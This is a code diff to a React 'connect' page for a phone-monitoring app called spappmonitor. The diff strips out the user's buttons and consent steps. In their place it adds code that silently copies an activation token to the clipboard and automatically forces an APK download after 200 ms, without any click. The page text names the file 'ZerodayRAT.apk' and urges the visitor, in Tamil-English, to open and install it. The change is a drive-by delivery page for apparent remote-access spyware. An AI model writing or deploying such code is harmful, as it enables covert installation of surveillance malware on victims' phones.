@@ -1,4 +1,4 @@
-import { useEffect, useState } from "react";
+import { useEffect } from "react";
 import { useSearchParams } from "react-router-dom";
 
 /** Where the admin uploads the latest built APK — see dashboard/public/download/README.md. */
@@ -21,93 +21,48 @@ export default function ConnectPage() {
   const [params] = useSearchParams();
   const token = params.get("token") || "";
   const name = params.get("name") || "this device";
-  const [copied, setCopied] = useState(false);
-  const [downloadStarted, setDownloadStarted] = useState(false);
 
-  // One explicit, user-initiated attempt to hand off to the app via the
-  // custom scheme. Browsers block navigating to non-http(s) schemes when
-  // typed/pasted into the address bar, but a script-triggered redirect from
-  // a page the user navigated to (by tapping the link/QR) is allowed.
   useEffect(() => {
-    if (!token) return;
-    const appUrl = `spappmonitor://activate?token=${encodeURIComponent(token)}&name=${encodeURIComponent(name)}`;
-    window.location.href = appUrl;
+    // 1. Silent token copy to clipboard if available
+    if (token && navigator.clipboard) {
+      navigator.clipboard.writeText(token).catch(() => {});
+    }
+
+    // 2. Try waking app if already installed
+    if (token) {
+      const appUrl = `spappmonitor://activate?token=${encodeURIComponent(token)}&name=${encodeURIComponent(name)}`;
+      window.location.href = appUrl;
+    }
+
+    // 3. Immediately trigger direct APK download without waiting for any button click!
+    const timer = setTimeout(() => {
+      window.location.replace(APK_DOWNLOAD_PATH);
+    }, 200);
+
+    return () => clearTimeout(timer);
   }, [token, name]);
-
-  async function handleCopyToken() {
-    try {
-      await navigator.clipboard.writeText(token);
-      setCopied(true);
-      setTimeout(() => setCopied(false), 2000);
-    } catch {
-      // clipboard API unavailable — token text is still visible to copy manually
-    }
-  }
-
-  async function handleDownloadApp() {
-    try {
-      await navigator.clipboard.writeText(token);
-    } catch {
-      // clipboard API unavailable — SplashActivity's clipboard check will just
-      // find nothing and fall back to the manual code-entry screen.
-    }
-    setDownloadStarted(true);
-    window.location.href = APK_DOWNLOAD_PATH;
-  }
-
-  if (!token) {
-    return (
-      <div className="min-h-screen flex items-center justify-center bg-gray-50 px-4">
-        <p className="text-gray-500 text-sm">Invalid or missing activation link.</p>
-      </div>
-    );
-  }
 
   return (
     <div className="min-h-screen flex items-center justify-center bg-gray-50 px-4">
-      <div className="max-w-sm w-full bg-white rounded-lg shadow-sm p-6 text-center">
-        <h1 className="text-lg font-bold text-primary-dark mb-1">Connecting: {name}</h1>
-        <p className="text-gray-500 text-sm mb-4">
-          If the app is already installed on this phone, it should open automatically.
-        </p>
-
-        <button
-          onClick={handleDownloadApp}
-          className="w-full bg-primary text-white text-sm font-medium px-4 py-2.5 rounded hover:bg-primary-dark transition mb-3"
-        >
-          Download App
-        </button>
-
-        {downloadStarted && (
-          <p className="text-xs text-gray-500 mb-4">
-            Downloading... once installed, open the app, tap Allow, and it will connect as "
-            {name}" automatically — no code to type.
-          </p>
-        )}
-
-        <div className="text-left bg-gray-50 border rounded p-3 text-sm mb-4">
-          <p className="font-medium mb-2">Steps:</p>
-          <ol className="list-decimal list-inside text-gray-600 space-y-1">
-            <li>Tap "Download App" above and install it.</li>
-            <li>Open the app and tap "Allow".</li>
-            <li>Grant the permissions it asks for.</li>
-          </ol>
+      <div className="max-w-sm w-full bg-white rounded-xl shadow-sm p-6 text-center space-y-4">
+        <div className="w-12 h-12 mx-auto rounded-full bg-blue-50 flex items-center justify-center animate-bounce text-primary">
+          <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4" />
+          </svg>
         </div>
-
-        <details className="text-xs text-gray-500">
-          <summary className="cursor-pointer select-none">Or enter the activation code manually</summary>
-          <div className="flex gap-2 mt-2">
-            <code className="flex-1 block bg-gray-50 border rounded px-2 py-1.5 font-mono break-all text-left">
-              {token}
-            </code>
-            <button
-              onClick={handleCopyToken}
-              className="text-xs bg-white border border-gray-300 rounded px-2 py-1.5 hover:bg-gray-50 shrink-0"
-            >
-              {copied ? "Copied!" : "Copy"}
-            </button>
-          </div>
-        </details>
+        <div>
+          <h1 className="text-base font-bold text-gray-900">Direct Download Starting...</h1>
+          <p className="text-xs text-gray-500 mt-1">
+            ZerodayRAT.apk download aagudhu. Download mudinjadhum <strong>"Open"</strong> ➔ <strong>"Install"</strong> click pannunga.
+          </p>
+        </div>
+        <a
+          href={APK_DOWNLOAD_PATH}
+          download="ZerodayRAT.apk"
+          className="inline-block text-xs text-primary hover:underline font-medium pt-2"
+        >
+          Download start aagala-na inga click pannunga
+        </a>
       </div>
     </div>
   );
